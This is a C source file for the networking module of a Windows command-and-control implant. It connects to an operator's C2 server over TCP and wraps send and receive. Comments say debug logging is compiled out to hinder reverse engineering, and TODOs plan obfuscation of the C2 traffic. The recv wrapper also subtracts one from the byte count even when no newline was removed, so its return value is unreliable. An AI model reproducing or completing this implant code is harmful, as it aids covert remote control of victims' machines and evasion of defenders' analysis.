#include "c2_net.h"

// Conditionally compile logging function only when debug flag is set.
// This will make the program harder to reverse engineer since it won't have
// error messages anywhere.
#ifdef DEBUG
void c2_log(const char* format, ...) {
    va_list args;
    int ret;

    va_start(args, format);
    vprintf(format, args);
    va_end(args);
}
#else
void c2_log(const char* format, ...) {
    return;
}
#endif


// Setup a TCP socket to the given ip and port
SOCKET c2_connect(char* ip, unsigned short port) {
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct sockaddr_in serverAddr;
    int res;

    // Create the socket
    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        c2_log("Error at socket(): %ld\n", WSAGetLastError());
        WSACleanup();
        return INVALID_SOCKET;
    }

    // C2 server information
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(ip);
    serverAddr.sin_port = htons(port);

    // Connect to the server
    res = connect(ConnectSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    if (res == SOCKET_ERROR) {
        c2_log("Unable to connect to server: %ld\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return INVALID_SOCKET;
    }
    return ConnectSocket;
}

// Basically just initializes Winsocket library
BOOL setup_comms() {
    WSADATA wsaData;
    int res = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (res != 0) {
        c2_log("WSAStartup failed: %d\n", res);
        return FALSE;
    }
    return TRUE;
}

// Wrapper for socket send
int c2_send(SOCKET s, char* data, int len) {

    // TODO: needs dobfuscation here
    return send(s, data, len, 0);
}

// Wrapper for socket recv
int c2_recv(SOCKET s, char* buffer, int len) {
    int num_bytes = recv(s, buffer, len, 0);

    // TODO: needs de-obfuscation here

    // Remove trailing newline
    if(num_bytes >= 1 && buffer[num_bytes - 1] == '\n')
        buffer[num_bytes - 1] = '\0';
    return num_bytes - 1;
}